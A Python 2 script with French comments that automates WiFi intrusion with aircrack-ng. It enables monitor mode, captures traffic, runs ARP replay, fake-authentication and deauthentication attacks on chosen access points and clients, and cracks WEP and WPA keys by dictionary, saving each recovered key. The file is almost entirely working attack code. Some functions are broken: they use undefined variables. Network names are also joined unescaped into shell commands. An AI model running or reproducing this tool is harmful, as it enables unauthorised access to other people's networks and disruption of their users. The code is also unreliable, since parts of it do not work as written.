#!/usr/bin/python
# -*- coding: utf-8 -*-

import time
import os
import signal
import subprocess
import logging
import threading
import re

"""
    Pour lancer mettre la clé wifi en monitoring (devient alors mon0)
"""
def monitoring():
    res = False
    logging.info("Running 'airmong-ng'..")
    cmd_only_airmon = subprocess.check_output(["airmon-ng"])
    fichier = open("airmon.txt", "w")
    fichier.write(cmd_only_airmon)
    fichier.close()
    fichier = open("airmon.txt", "r")
    file_line = fichier.readline()
    wlan_wanted = ""
    while file_line != "":
        file_line = fichier.readline()
        if "rt2800" in file_line:
            logging.info("Found a rt2800 !")
            wlan_wanted = file_line[:5].replace(" ", "")
            res = True
        else:
            logging.info("Haven't found any rt2800.. cannot continue..")
    cmd_monitoring = subprocess.check_output(["airmon-ng", "start", wlan_wanted])
    return res

"""
    Ecoute globale, commande airodump (à executer apres le monitoring)
    time: temps de l'écoute en seconde(s)
"""
def global_listening():
    logging.info("Global listening. File are recorded into TestBox/global folder.")
    cmd = "airodump-ng -w TestBox/global/record mon0"
    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

"""
    Ecoute locale sur une seule box via un fichier xml parsé
    registered_network : box sur laquelle on écoute
"""
def network_listening(registered_network):
    BSSID = registered_network._BSSID
    ESSID = registered_network._ESSID
    Channel = registered_network._Channel
    logging.info("Network listening. File are recorded into TestBox/%s folder.", ESSID)

    cmd = "airodump-ng -w TestBox/" + ESSID + "/record -d " + BSSID + " mon0 --channel " + str(Channel) +" --ignore-negative-one"

    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)

    return pro.pid

"""
    lance une authentification pour garder un lien et exécuter une attaque arp
"""
def keep_alive_packet(box):
    BSSID = box._BSSID
    ESSID = box._ESSID
    logging.info("Sending keep alive paquets to %s", ESSID)
    cmd = "aireplay-ng -1 6000 -o 1 -q 10 -e " + ESSID + " -h " + BSSID + " mon0 --ignore-negative-one"
    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

"""
    Lancement de l'attaque arp
    registered_network: box que l'on attaque
    /!\ tous les chemins sont en relatifs !!
"""
def arp_attack(registered_network):
    BSSID = registered_network._BSSID
    ESSID = registered_network._ESSID
    Channel = registered_network._Channel
    logging.info("Arp attack on %s", ESSID)

    cmd = "aireplay-ng -3 -e " + ESSID + " -h " + BSSID + " mon0 --ignore-negative-one";

    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

"""
    Decryptage des iv/cap pour l'obtention de la clé
    datafile_path : dossiers dans lesquels sont les .cap/.iv
"""
def aircrack_final_wep(datafile_path):
    logging.info("Applying aircrack for WEP on %s", datafile_path)
    cmd = "aircrack-ng " + datafile_path + "/*.cap > " + datafile_path + ".result"

    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

def aircrack_final_wpa(datafile_path):
    logging.info("Applying aircrack for WPA on %s", datafile_path)
    cmd = "aircrack-ng -w dictionnaire/* " + datafile_path + "/*.cap > " +  datafile_path + ".result"

    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

def deauthentication_attack(box, client):
    BSSID = box._BSSID
    mac_client = client._MAC_CLIENT
    logging.info("Deauthentication on [%s | %s]", BSSID, mac_client)
    cmd = "aireplay-ng -0 10 -a " + BSSID + " -c " + mac_client + " mon0 --ignore-negative-one"

    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

def result_aircrack_wep(data_file_path):
    t_aircrack = threading.Thread(target=aircrack_final_wep, args=(datafile_path,))
    key_file_name = datafile_path + ".result"
    KEY = ""
    t.start()
    while KEY == "":
        KEY = get_key(datafile_path)
        time.sleep(5)
    os.remove(key_file_name)
    cmd = "echo \" WEP_box_path : " + datafile_path + " with key " + KEY + "\" >> key.result"
    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

def result_aircrack_wpa(datafile_path):
    t_aircrack = threading.Thread(target=aircrack_final_wpa, args=(datafile_path,))
    key_file_name = datafile_path + ".result"
    KEY = ""
    while KEY == "" :
        if t_aircrack.isAlive() == False :
            logging.warning("%s n'a pas reussi à lancer Aircrack-ng", datafile_path)
            print 'Lancement de aircrack-ng'
            t_aircrack = threading.Thread(target=aircrack_final_wpa, args=(datafile_path,))
            t_aircrack.start()
        KEY = get_key(datafile_path)
        time.sleep(5)
    os.remove(key_file_name)
    cmd = "echo \" WPA_box_path : " + datafile_path + " with key " + KEY + "\" >> key.result"
    FNULL = open(os.devnull, 'w')
    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    return pro.pid

def get_key(datafile_path):
    file_name = datafile_path + ".result"
    key = ""
    pattern = re.compile("KEY FOUND! \[ [^!]+ \]")
    try:
        fichier = open(file_name, 'r')
        file_line = fichier.readline()
        while file_line != "" and key == "":
            res = pattern.search(file_line)
            if res != None:
                key = file_line[res.start():res.end()]
            file_line = fichier.readline()
    except:
        pass
    return key
